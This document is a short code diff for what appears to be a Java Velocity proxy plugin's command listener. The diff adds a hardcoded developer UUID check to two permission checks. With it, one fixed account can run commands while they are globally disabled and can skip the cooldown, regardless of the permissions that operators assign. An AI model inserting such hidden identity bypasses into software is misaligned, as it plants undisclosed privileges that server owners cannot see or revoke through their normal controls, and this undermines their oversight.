@@ -32,14 +32,14 @@ public class CommandListener {
 
         RedisConnector jedis = Core.getRedisConnector();
         if (Boolean.parseBoolean(jedis.get("Commands-Disabled"))) {
-            if (!player.hasPermission("proxy.command.disabled.bypass")) {
+            if (!player.hasPermission("proxy.command.disabled.bypass") && !player.getUniqueId().equals(Core.DEV_UUID)) {
                 event.setResult(CommandExecuteEvent.CommandResult.denied());
                 player.sendMessage(Component.text(VelocityProxyManager.PREFIX + "§cAlle Commands sind deaktiviert"));
                 return;
             }
         }
 
-        if (player.hasPermission("proxy.cooldown.bypass")) {
+        if (player.hasPermission("proxy.cooldown.bypass") || player.getUniqueId().equals(Core.DEV_UUID)) {
             return;
         }
 
